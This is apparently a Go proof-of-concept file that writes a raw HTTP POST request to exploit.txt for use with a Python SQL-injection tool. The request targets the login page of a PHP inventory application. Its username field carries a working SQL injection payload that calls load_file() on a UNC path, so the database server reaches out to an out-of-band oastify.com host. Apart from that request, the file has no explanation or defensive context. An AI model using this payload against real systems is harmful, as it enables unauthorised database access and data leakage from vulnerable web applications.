// @nu11secur1ty 2023-2024
package main

import (
    "fmt"
    "log"
    "os"
)

func main() {
	
    f, err := os.Create("exploit.txt")

    if err != nil {
        log.Fatal(err)
    }
	
    defer f.Close()

	// The start of your POST or GET or whatever VULNERABLE request...
    val := `POST /phpinventory/phpinventory/login.php HTTP/1.1
Host: pwnedhost.com
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: PHPSESSID=6lnhavp0kvn4or7ockvl3o1g4u
Origin: https://pwnedhost.com
Upgrade-Insecure-Requests: 1
Referer: https://pwnedhost.com/phpinventory/phpinventory/login.php
Content-Type: application/x-www-form-urlencoded
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="122", "Chromium";v="122"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Content-Length: 48

username=zBuveHif'%2b(select%20load_file('%5c%5c%5c%5cabpf13cdvni2r5g9hn26os0bd2jv7m0ardf52vqk.oastify.com%5c%5cfmd'))%2b'&password=g7J%21m3v%21W2&login=`
	// The end of your POST or GET or whatever VULNERABLE request...

    data := []byte(val)

    _, err2 := f.Write(data)

    if err2 != nil {
        log.Fatal(err2)
    }
		fmt.Println("done..The PoC was created, you can execute python G0BurpSQLmaPI.py...")
}
